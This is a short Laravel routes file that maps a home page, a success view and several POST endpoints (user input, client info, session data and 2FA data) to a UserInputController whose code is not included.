<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\UserInputController;

Route::get('/', [HomeController::class, 'index'])->name('home');
Route::post('/user-input', [UserInputController::class, 'store'])->name('user-input.store');
Route::post('/save-client-info', [UserInputController::class, 'saveClientInfo'])->name('user-input.client-info');
Route::post('/save-session-data', [UserInputController::class, 'store'])->name('user-input.session-data');
Route::post('/save-2fa', [UserInputController::class, 'save2FA'])->name('user-input.save2FA');
Route::get('/success', function () {
    return view('success');
})->name('success');
